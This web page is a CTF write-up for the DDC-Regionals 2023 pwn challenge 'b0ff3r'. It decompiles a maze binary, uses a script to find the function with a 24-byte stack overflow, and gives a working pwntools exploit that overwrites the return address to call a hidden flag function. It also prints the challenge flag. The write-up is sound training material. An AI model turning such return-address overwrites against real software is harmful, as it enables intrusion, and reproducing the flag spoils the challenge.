<!doctype html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Writeups</title>
        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
        <script type="text/x-mathjax-config">
            MathJax.Hub.Config({
                tex2jax: {
                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
                    processEscapes: true
                },
                config: ["MMLorHTML.js"],
                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
                extensions: ["MathMenu.js", "MathZoom.js"]
            });
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
    </head>
    <body>
        <div id="navbar">
            <a href="/CTF-writeups" id="root-link">
                <h2>Rektedekte</h2>
            </a>
            <ul id="nav-links">
				<li><a href="/CTF-writeups/search" class="no-flash">
					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
				</a></li>
                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
                </a></li>
                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
                </a></li>
                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
                </a></li>
            </ul>
        </div>
        
    <div id="content">
        <h3>
            <a href="/CTF-writeups\ddc-regionals-2023">DDC-Regionals 2023</a>
            <a href="/CTF-writeups\ddc-regionals-2023\b0ff3r/files.zip" class="text-right">Download</a>
        </h3>
        <h1>
            <span>b0ff3r</span>
            <span class="text-right">[1000]</span>
        </h1>
        <hr class="no-space">
        
            
    <div class="tags">
        
            
                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
            
        
    </div>

        
        
            <div id="markdown">
                <h3>Description</h3>
<p>For this challenge, we are given a binary <code>b0ff3r</code>.</p>
<blockquote>
<p><strong>Proposed difficulty:</strong> Medium</p>
<p>Mazes, mazes, mazes... should I find the exit or break the stack? get your binary <a href="https://nextcloud.ntp-event.dk:8443/s/9pcSDdyiXL6qwRF/download/b0ff3r.zip">here</a><br />
The remote can be found at <code>b0ff3r.hkn:5000</code>.</p>
<p>(Bemærk: Domænet står forkert i beskrivelsen på Haaukins).</p>
</blockquote>
<hr />
<h3>Note</h3>
<p>This is actually a challenge I didn't manage to solve during the CTF. I got as far, as knowing completely <em>what</em> I had to do, but not knowing the tools to actually do it. In fact, the tools I needed were mentioned in writeups for the qualifier challenge Amaze; writeups that I couldn't access, because the writeup channel on the official discord had been hidden.</p>
<hr />
<h3>Overview</h3>
<p>Opening the program in ghidra, we are met with quite a large binary. Ghidra calculates a total of 2556 functions. Some of the functions have names, such as <code>start</code>, <code>win</code> and <code>flag</code>, but most are just generic names generated by ghidra.</p>
<p>Looking at one such function, we can immediately see whay this challenge is about:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">f_981707284</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">comp</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buff</span><span class="w"> </span><span class="p">[</span><span class="mi">848</span><span class="p">];</span>

<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Where do you want to go? (north/south/east/west)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mi">848</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
<span class="w">  </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;north&quot;</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">wall</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;south&quot;</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">wall</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;west&quot;</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">f_1214355757</span><span class="p">();</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;east&quot;</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">f_3525523581</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid input! you are going back one step</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>This challenge is a maze challenge, just like Amaze from the qualifiers. Jumping over to the <code>win</code> function, we would assume that this is our target:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;You won! Thanks for all the fish!&quot;</span><span class="p">);</span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>However, the function doesn't seem to contain any flags, not even an indication that the remote will. The answer lies in the <code>flag</code> function:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Congrats! Here</span><span class="se">\&#39;</span><span class="s">s your flag: DDC{xxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;</span><span class="p">);</span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>So there is our flag. But how do we get to it? Loading up ghidras call tree, we see an interesting issue:</p>
<p><img alt="" src="flag_flow.png" /></p>
<p>The function isn't referenced anywhere. As such, it is not a part of the maze, and therefore, we cannot reach it.</p>
<hr />
<h3>Buffer overflow</h3>
<p>Going off of the challenge name and description (and that the challenge is in binary exploitation), let's assume that there is a buffer overflow <em>somewhere</em> within this program. How would we even find it among 2500 functions? During the ctf, I briefly tried to do it manually, but the process was too slow. Instead, I bodged a script together to find it.</p>
<p>Look at the first few lines of a given maze point:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">f_999575277</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">comp</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buff</span><span class="w"> </span><span class="p">[</span><span class="mi">688</span><span class="p">];</span>

<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Where do you want to go? (north/south/east/west)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mi">688</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</code></pre></div>

<p>The code is almost entirely identical between the different functions. The only difference, is the size of the buffer. Looking at the disassembly:</p>
<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="err">0040199</span><span class="nf">d</span><span class="w"> </span><span class="mi">55</span><span class="w">              </span><span class="no">PUSH</span><span class="w">       </span><span class="no">RBP</span>
<span class="w">        </span><span class="err">0040199</span><span class="nf">e</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="mi">89</span><span class="w"> </span><span class="no">e5</span><span class="w">        </span><span class="no">MOV</span><span class="w">        </span><span class="no">RBP</span><span class="p">,</span><span class="no">RSP</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">a1</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="mi">81</span><span class="w"> </span><span class="no">ec</span><span class="w">        </span><span class="no">SUB</span><span class="w">        </span><span class="no">RSP</span><span class="p">,</span><span class="mi">0x2b0</span>
<span class="w">                 </span><span class="nf">b0</span><span class="w"> </span><span class="mi">02</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">a8</span><span class="w"> </span><span class="no">bf</span><span class="w"> </span><span class="mi">98</span><span class="w"> </span><span class="no">b0</span><span class="w">        </span><span class="no">MOV</span><span class="w">        </span><span class="no">EDI</span><span class="err">=&gt;</span><span class="no">s_Where_do_you_want_to_go</span><span class="err">?</span><span class="no">_</span><span class="p">(</span><span class="no">north</span><span class="err">/</span><span class="no">_0048b0</span><span class="w">   </span><span class="err">=</span><span class="w"> </span><span class="err">&quot;</span><span class="no">Where</span><span class="w"> </span><span class="no">do</span><span class="w"> </span><span class="no">you</span><span class="w"> </span><span class="no">want</span><span class="w"> </span><span class="no">to</span><span class="w"> </span><span class="no">go</span><span class="err">?</span><span class="w"> </span><span class="p">(</span><span class="no">nor</span>
<span class="w">                 </span><span class="err">48</span><span class="w"> </span><span class="err">00</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">ad</span><span class="w"> </span><span class="no">e8</span><span class="w"> </span><span class="mi">8</span><span class="no">e</span><span class="w"> </span><span class="no">f6</span><span class="w">        </span><span class="no">CALL</span><span class="w">       </span><span class="err">&lt;</span><span class="no">EXTERNAL</span><span class="err">&gt;</span><span class="p">::</span><span class="no">puts</span><span class="w">                                 </span><span class="no">int</span><span class="w"> </span><span class="no">puts</span><span class="p">(</span><span class="no">char</span><span class="w"> </span><span class="p">*</span><span class="w"> </span><span class="no">__s</span><span class="p">)</span>
<span class="w">                 </span><span class="nf">ff</span><span class="w"> </span><span class="no">ff</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">b2</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="mi">8</span><span class="no">b</span><span class="w"> </span><span class="mi">15</span><span class="w">        </span><span class="no">MOV</span><span class="w">        </span><span class="no">RDX</span><span class="p">,</span><span class="no">qword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">stdin</span><span class="p">]</span>
<span class="w">                 </span><span class="nf">a7</span><span class="w"> </span><span class="mi">36</span><span class="w"> </span><span class="mi">0</span><span class="no">a</span><span class="w"> </span><span class="mi">00</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">b9</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="mi">8</span><span class="no">d</span><span class="w"> </span><span class="mi">85</span><span class="w">        </span><span class="no">LEA</span><span class="w">        </span><span class="no">RAX</span><span class="err">=&gt;</span><span class="no">buff</span><span class="p">,[</span><span class="no">RBP</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">-0</span><span class="no">x2b0</span><span class="p">]</span>
<span class="w">                 </span><span class="err">50</span><span class="w"> </span><span class="nf">fd</span><span class="w"> </span><span class="no">ff</span><span class="w"> </span><span class="no">ff</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">c0</span><span class="w"> </span><span class="no">be</span><span class="w"> </span><span class="no">b0</span><span class="w"> </span><span class="mi">02</span><span class="w">        </span><span class="no">MOV</span><span class="w">        </span><span class="no">ESI</span><span class="p">,</span><span class="mi">0x2b0</span>
<span class="w">                 </span><span class="err">00</span><span class="w"> </span><span class="err">00</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">c5</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="mi">89</span><span class="w"> </span><span class="no">c7</span><span class="w">        </span><span class="no">MOV</span><span class="w">        </span><span class="no">RDI</span><span class="p">,</span><span class="no">RAX</span>
<span class="w">        </span><span class="err">004019</span><span class="nf">c8</span><span class="w"> </span><span class="no">e8</span><span class="w"> </span><span class="mi">93</span><span class="w"> </span><span class="no">f6</span><span class="w">        </span><span class="no">CALL</span><span class="w">       </span><span class="err">&lt;</span><span class="no">EXTERNAL</span><span class="err">&gt;</span><span class="p">::</span><span class="no">fgets</span><span class="w">                                </span><span class="no">char</span><span class="w"> </span><span class="p">*</span><span class="w"> </span><span class="no">fgets</span><span class="p">(</span><span class="no">char</span><span class="w"> </span><span class="p">*</span><span class="w"> </span><span class="no">__s</span><span class="p">,</span><span class="w"> </span><span class="no">int</span><span class="w"> </span><span class="no">__n</span>
<span class="w">                 </span><span class="nf">ff</span><span class="w"> </span><span class="no">ff</span>
</code></pre></div>

<p>Assuming we can find a suitable crib, we can iterate through the binary, simply checking the read and buffer size by offset from the crib. In this case, I chose <code>MOV RDI, RAX</code> as my crib, though there are probably better choices.</p>
<p>I ended up with this piece of code:</p>
<div class="codehilite"><pre><span></span><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;./b0ff3r_handout&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">crib</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x48\x89\xc7</span><span class="s2">&quot;</span>

<span class="k">def</span> <span class="nf">check_overflow</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">read_size</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Load the size fgets read </span>
    <span class="n">buff_size</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">33</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">32</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Load the size of the buffer</span>
    <span class="n">buff_size_alt</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">27</span><span class="p">]</span>  <span class="c1"># If size &lt; 0xff, it will be stored as a byte, therefore different location</span>

    <span class="k">if</span> <span class="n">buff_size_alt</span> <span class="o">!=</span> <span class="mi">176</span><span class="p">:</span>  <span class="c1"># Address byte used in following mov</span>
        <span class="n">buff_size</span> <span class="o">=</span> <span class="n">buff_size_alt</span>

    <span class="k">return</span> <span class="n">read_size</span> <span class="o">&gt;</span> <span class="n">buff_size</span>  <span class="c1"># If read is bigger, we have overflow</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">crib</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x00</span><span class="s2">&quot;</span><span class="p">:</span>  <span class="c1"># Filter unwanted</span>
        <span class="k">if</span> <span class="n">check_overflow</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Overflow at </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x400000</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>

<p>As you can see, it is slightly more complicated, because the compiler uses a singular byte when size &lt; 0xff. But still, running this code, we get:</p>
<div class="codehilite"><pre><span></span><code>Overflow at 0x439336
</code></pre></div>

<p>Going to this function and indeed, we have an overflow of 24 bytes:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">comp</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buff</span><span class="w"> </span><span class="p">[</span><span class="mi">240</span><span class="p">];</span>

<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Where do you want to go? (north/south/east/west)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mi">264</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
<span class="w">  </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;north&quot;</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="mi">39</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;south&quot;</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">f_2592171378</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;west&quot;</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">f_103901017</span><span class="p">();</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="s">&quot;east&quot;</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">f_3267842052</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid input! you are going back one step</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Let's check the security real quick:</p>
<div class="codehilite"><pre><span></span><code>gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></div>

<p>Nothing stops us from simply overwriting <code>rip</code> with the address of <code>flag</code> to win.</p>
<hr />
<h3>Finding the path</h3>
<p>This is as far as I made it during the CTF. I knew that tools for handling this existed, I also knew that it could technically be solved by brute force, but without knowing how long either would take, I simply didn't want to take that risk.</p>
<p>After the CTF, I picked up a writeup Mathias#4588, which as of writing can be found <a href="http://213.152.161.133:9996/writeups/ddc_qualifiers_2023/reverse_engineering/a-maze.html">here</a>. The just of it is using Cytoscape with PathLinker and dot-app from the app manager, combined with a filtered graphviz output from radare2. The full explanation can be found in his writeup, and for good measure, I have included the file in my challenge zip, which can be downloaded at the top of this page (in case he changes ip).</p>
<p>The result is a path that looks like this:</p>
<div class="codehilite"><pre><span></span><code>south
east
south
south
east
east
south
south
south
south
south
south
south
east
east
south
east
east
east
south
south
east
east
east
east
east
east
east
east
east
south
south
south
east
east
south
south
south
south
</code></pre></div>

<hr />
<h3>Solution</h3>
<p>With the path in hand, the challenge is easy. Considering the use <code>LEAVE</code>, we must write 248 bytes of padding, followed by the address of <code>flag</code>. </p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./b0ff3r_handout&quot;</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/tools/peda/peda.py&quot;</span>
<span class="c1"># conn = gdb.debug(&quot;./b0ff3r_handout&quot;, &#39;&#39;&#39;</span>
<span class="c1"># b *0x0043930e</span>
<span class="c1"># c</span>
<span class="c1"># &#39;&#39;&#39;)</span>

<span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&quot;b0ff3r.hkn&quot;</span><span class="p">,</span> <span class="mi">5000</span><span class="p">)</span>

<span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">south</span>
<span class="s2">east</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">south</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">east</span>
<span class="s2">east</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">south</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">path</span> <span class="o">=</span> <span class="p">[</span><span class="n">direction</span> <span class="k">for</span> <span class="n">direction</span> <span class="ow">in</span> <span class="n">path</span> <span class="k">if</span> <span class="n">direction</span><span class="p">]</span>  <span class="c1"># Filter stray &quot;&quot;</span>

<span class="k">for</span> <span class="n">direction</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;)</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">direction</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>  <span class="c1"># Navigate the path</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">248</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;flag&quot;</span><span class="p">])</span>

<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;)</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># Overwrite rip</span>

<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>Running the script gives us the flag: <code>DDC{b0ff3r_0v3rfl0w_1s_4w3s0m3}</code></p>
            </div>
        
        
    </div>

    </body>
</html>